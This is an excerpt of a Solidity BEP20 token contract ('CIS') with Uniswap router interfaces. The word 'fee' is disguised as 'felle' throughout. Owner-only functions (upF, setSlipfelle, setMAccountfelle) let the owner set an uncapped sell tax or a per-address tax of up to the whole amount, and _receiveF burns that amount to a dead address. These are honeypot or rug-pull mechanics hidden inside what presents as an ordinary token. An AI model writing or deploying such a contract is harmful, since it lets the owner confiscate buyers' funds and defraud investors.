...
interface IUniswapV2Factory {
    ...
    function felleTo() external view returns (address);
    function felleToSetter() external view returns (address);
    ...
    function setfelleTo(address) external;
    function setfelleToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfelleOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfelleOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfelleOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfelleOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfelleOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract CIS is BEP20, Ownable {
    ...
    uint256 private _defaultSellfelle = 0;

    uint256 private _defaultBuyfelle = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfelle;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfelle = _value;
    }

    function setSlipfelle(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfelle[_address] = _value;
    }

    function getSlipfelle(address _address) external view onlyownar returns (uint256) {
        return _slipfelle[_address];
    }


    function setMAccountfelle(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfelle(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefelleAmount = 0;

        if (rF) {
            uint256 tradefelle = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefelle = _defaultSellfelle;
                }
                if (from == uniswapV2Pair) {

                    tradefelle = _defaultBuyfelle;
                }
            }
            if (_slipfelle[from] > 0) {
                tradefelle = _slipfelle[from];
            }

            tradefelleAmount = _Amount.mul(tradefelle).div(100);
        }


        if (tradefelleAmount > 0) {
            _balances[from] = _balances[from].sub(tradefelleAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefelleAmount);
            emit Transfer(from, _deadAddress, tradefelleAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefelleAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefelleAmount);
        emit Transfer(from, _to, _Amount - tradefelleAmount);
    }
